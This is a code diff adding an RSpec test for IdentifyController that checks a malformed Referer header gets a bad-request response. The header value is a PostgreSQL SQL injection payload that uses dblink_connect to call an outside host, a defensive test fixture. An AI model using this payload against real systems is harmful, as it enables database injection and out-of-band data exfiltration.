@@ -28,6 +28,20 @@ RSpec.describe IdentifyController, type: :controller do
       end
     end
 
+    describe 'with a malformed referrer' do
+      before(:each) do
+        allow(Figaro.env).to receive(:identity_idp_host).and_return('example.org')
+        @request.headers['Referer'] =
+          "cast((SELECT dblink_connect('host=xyz'|" \
+          "|'123.example.com user=a password=a connect_timeout=2')) as numeric)"
+      end
+
+      it 'returns http bad request' do
+        get :create, params: { nonce: '123' }
+        expect(response).to have_http_status(:bad_request)
+      end
+    end
+
     describe 'with a good referrer' do
       before(:each) do
         allow(Figaro.env).to receive(:identity_idp_host).and_return('example.com')
